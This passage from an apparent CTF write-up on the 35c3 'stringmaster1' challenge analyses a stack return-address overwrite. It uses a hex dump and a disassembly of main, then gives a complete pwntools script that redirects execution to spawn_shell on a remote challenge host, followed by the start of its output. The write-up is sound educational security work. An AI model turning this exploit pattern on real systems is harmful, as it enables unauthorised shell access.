auto index = s.find(c1);
            cout = 0) {
                s[index] = c2;
            }
```
Furthermore, when calling `print` at this state, the program prints much more information than earlier:
```
> print
dzreaxqrqc      )
       auvvlvepeo      0)
       cxreaxqrqc                     $@     @     `*                  m$@         {|  *  h*  y.|   S$@             :PQ@     `*                  ::~a             O  O  MO  iO  O  O          !        p                                  d                                                      i,                        O Xx86_64
```
Can this be the stack? Let's take a look at the hex output of such a sequence:
```
00000000  63 78 63 67  64 62 74 69  76 67 00 00  00 00 00 00  â”‚cxcgâ”‚dbtiâ”‚vgÂ·Â·â”‚Â·Â·Â·Â·â”‚
00000010  20 94 2c 57  fe 7f 00 00  0a 00 00 00  00 00 00 00  â”‚ Â·,Wâ”‚Â·Â·Â·Â·â”‚Â·Â·Â·Â·â”‚Â·Â·Â·Â·â”‚
00000020  6f 64 65 78  62 61 6f 67  63 64 00 00  00 00 00 00  â”‚odexâ”‚baogâ”‚cdÂ·Â·â”‚Â·Â·Â·Â·â”‚
00000030  40 94 2c 57  fe 7f 00 00  0a 00 00 00  00 00 00 00  â”‚@Â·,Wâ”‚Â·Â·Â·Â·â”‚Â·Â·Â·Â·â”‚Â·Â·Â·Â·â”‚
00000040  63 78 63 67  64 62 74 69  76 67 00 00  00 00 00 00  â”‚cxcgâ”‚dbtiâ”‚vgÂ·Â·â”‚Â·Â·Â·Â·â”‚
00000050  02 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  â”‚Â·Â·Â·Â·â”‚Â·Â·Â·Â·â”‚Â·Â·Â·Â·â”‚Â·Â·Â·Â·â”‚
00000060  e0 24 40 00  00 00 00 00  c0 10 40 00  00 00 00 00  â”‚Â·$@Â·â”‚Â·Â·Â·Â·â”‚Â·Â·@Â·â”‚Â·Â·Â·Â·â”‚
00000070  70 95 2c 57  fe 7f 00 00  00 00 00 00  00 00 00 00  â”‚pÂ·,Wâ”‚Â·Â·Â·Â·â”‚Â·Â·Â·Â·â”‚Â·Â·Â·Â·â”‚
00000080  00 00 00 00  00 00 00 00  6d 24 40 00  00 00 00 00  â”‚Â·Â·Â·Â·â”‚Â·Â·Â·Â·â”‚m$@Â·â”‚Â·Â·Â·Â·â”‚
00000090  00 00 00 00  00 00 00 00  17 7b bd ed  8b 7f 00 00  â”‚Â·Â·Â·Â·â”‚Â·Â·Â·Â·â”‚Â·{Â·Â·â”‚Â·Â·Â·Â·â”‚
000000a0  88 95 2c 57  fe 7f 00 00  78 95 2c 57  fe 7f 00 00  â”‚Â·Â·,Wâ”‚Â·Â·Â·Â·â”‚xÂ·,Wâ”‚Â·Â·Â·Â·â”‚
000000b0  b0 79 e4 ed  01 00 00 00  53 24 40 00  00 00 00 00  â”‚Â·yÂ·Â·â”‚Â·Â·Â·Â·â”‚S$@Â·â”‚Â·Â·Â·Â·â”‚
000000c0  00 00 00 00  00 00 00 00  c7 78 5f 4e  c0 30 b5 12  â”‚Â·Â·Â·Â·â”‚Â·Â·Â·Â·â”‚Â·x_Nâ”‚Â·0Â·Â·â”‚
000000d0  c0 10 40 00  00 00 00 00  70 95 2c 57  fe 7f 00 00  â”‚Â·Â·@Â·â”‚Â·Â·Â·Â·â”‚pÂ·,Wâ”‚Â·Â·Â·Â·â”‚
000000e0  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  â”‚Â·Â·Â·Â·â”‚Â·Â·Â·Â·â”‚Â·Â·Â·Â·â”‚Â·Â·Â·Â·â”‚
000000f0  c7 78 df 2e  19 9e 49 ed  c7 78 01 f2  3a eb a2 ed  â”‚Â·xÂ·.â”‚Â·Â·IÂ·â”‚Â·xÂ·Â·â”‚:Â·Â·Â·â”‚
00000100  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  â”‚Â·Â·Â·Â·â”‚Â·Â·Â·Â·â”‚Â·Â·Â·Â·â”‚Â·Â·Â·Â·â”‚
00000110  00 00 00 00  00 00 00 00  88 95 2c 57  fe 7f 00 00  â”‚Â·Â·Â·Â·â”‚Â·Â·Â·Â·â”‚Â·Â·,Wâ”‚Â·Â·Â·Â·â”‚
00000120  70 f1 f4 ed  8b 7f 00 00  d6 51 f3 ed  8b 7f 00 00  â”‚pÂ·Â·Â·â”‚Â·Â·Â·Â·â”‚Â·QÂ·Â·â”‚Â·Â·Â·Â·â”‚
00000130  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  â”‚Â·Â·Â·Â·â”‚Â·Â·Â·Â·â”‚Â·Â·Â·Â·â”‚Â·Â·Â·Â·â”‚
00000140  00 00 00 00  00 00 00 00  c0 10 40 00  00 00 00 00  â”‚Â·Â·Â·Â·â”‚Â·Â·Â·Â·â”‚Â·Â·@Â·â”‚Â·Â·Â·Â·â”‚
00000150  70 95 2c 57  fe 7f 00 00  ea 10 40 00  00 00 00 00  â”‚pÂ·,Wâ”‚Â·Â·Â·Â·â”‚Â·Â·@Â·â”‚Â·Â·Â·Â·â”‚
00000160  68 95 2c 57  fe 7f 00 00  1c 00 00 00  00 00 00 00  â”‚hÂ·,Wâ”‚Â·Â·Â·Â·â”‚Â·Â·Â·Â·â”‚Â·Â·Â·Â·â”‚
00000170  01 00 00 00  00 00 00 00  fd a7 2c 57  fe 7f 00 00  â”‚Â·Â·Â·Â·â”‚Â·Â·Â·Â·â”‚Â·Â·,Wâ”‚Â·Â·Â·Â·â”‚
00000180  00 00 00 00  00 00 00 00  0d a8 2c 57  fe 7f 00 00  â”‚Â·Â·Â·Â·â”‚Â·Â·Â·Â·â”‚Â·Â·,Wâ”‚Â·Â·Â·Â·â”‚
00000190  18 a8 2c 57  fe 7f 00 00  2c a8 2c 57  fe 7f 00 00  â”‚Â·Â·,Wâ”‚Â·Â·Â·Â·â”‚,Â·,Wâ”‚Â·Â·Â·Â·â”‚
000001a0  3c a8 2c 57  fe 7f 00 00  58 a8 2c 57  fe 7f 00 00  â”‚ s sym.main
[0x00402453]> pdf
            ;-- main:
/ (fcn) sym.main 36
|   sym.main (int argc, char **argv, char **envp);
|           ; DATA XREF from entry0 (0x4010dd)
|           0x00402453      4883ec08       sub rsp, 8
|           0x00402457      bf00000000     mov edi, 0
|           0x0040245c      e84febffff     call sym.imp.time           ; time_t time(time_t *timer)
|           0x00402461      89c7           mov edi, eax
|           0x00402463      e868ebffff     call sym.imp.srand          ; void srand(int seed)
|           0x00402468      e867f0ffff     call sym.play
|           0x0040246d      b800000000     mov eax, 0
|           0x00402472      4883c408       add rsp, 8
\           0x00402476      c3             ret
```
The function calls `play`, which drives the game. After the game finishes, we will return to the following command:
```assembly
0x0040246d      b800000000     mov eax, 0
```
And indeed, we can see this return address in the hex dump, at location 0x88:
```
00000080  00 00 00 00  00 00 00 00  6d 24 40 00  00 00 00 00  â”‚Â·Â·Â·Â·â”‚Â·Â·Â·Â·â”‚m$@Â·â”‚Â·Â·Â·Â·â”‚
```
If so, we can easily replace the return address with anything we want by playing the swap & replace game, and then quit the game to jump to a location of our choice. Obviously, the natural choice would be to jump to `spawn_shell`.
Putting it all together:
```python
from pwn import *
import argparse
import os
import string
#context.log_level = "debug"
LOCAL_PATH = "./stringmaster1"
def get_process(is_remote = False):
    if is_remote:
        return remote("35.207.132.47", 22224)
    else:
        return process(LOCAL_PATH)
def read_menu(proc):
    proc.recvuntil("\n> ")
def swap(proc, index1, index2):
    read_menu(proc)
    proc.sendline("swap")
    proc.sendline("{} {}".format(index1, index2))
    log.info("Swapping index {} and {}".format(index1, index2))
def replace(proc, char1, char2):
    read_menu(proc)
    proc.sendline("replace")
    proc.sendline("{} {}".format(char1, char2))
    log.info("Replacing '{}' and '{}'".format(char1, char2))
def print_info(proc):
    read_menu(proc)
    proc.sendline("print")
    return proc.recvuntil("\nEnter the command you want to execute:", drop = True)
def quit(proc):
    read_menu(proc)
    proc.sendline("quit")
    log.info("Quitting...")
parser = argparse.ArgumentParser()
parser.add_argument("-r", "--remote", help="Execute on remote server", action="store_true")
args = parser.parse_args()
e = ELF(LOCAL_PATH)
p = get_process(args.remote)
p.recvuntil("String1: ")
str1 = p.recvline()
p.recvuntil("String2: ")
str2 = p.recvline()
log.info("String 1: {}".format(str1))
log.info("String 2: {}".format(str2))
for x in string.ascii_lowercase:
    if x not in str1:
        missing_letter = x
        break
replace(p, x, x)
# 0x40246d (ret) -> 0x4011A7 (shell)
spawn_shell_addr = e.symbols["_Z11spawn_shellv"]
log.info("Address of spawn_shell: {}".format(hex(spawn_shell_addr)))
print "Before modification:"
print hexdump(print_info(p))
base_index = 0x88
for i, char in enumerate(p64(spawn_shell_addr)):
    replace(p, str1[0], char)
    swap(p, 0, base_index + i)
    str1 = print_info(p)[:len(str1)]
print "After modification:"
print hexdump(print_info(p))
quit(p)
p.interactive()
```
The output:
```
root@kali:/media/sf_CTFs/35c3ctf/stringmaster1# python exploit.py -r
[*] '/media/sf_CTFs/35c3ctf/stringmaster1/stringmaster1'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to 35.207.132.47 on port 22224: Done
[*] String 1: xiubaoxvlf
[*] String 2: xhipigncjw
[*] Replacing 'c' and 'c'
[*] Address of spawn_shell: 0x4011a7
Before modification:
00000000  78 69 75 62  61 6f 78 76  6c 66 00 00  00 00 00 00  â”‚xiubâ”‚aoxvâ”‚lfÂ·Â·â”‚Â·Â·Â·Â·â”‚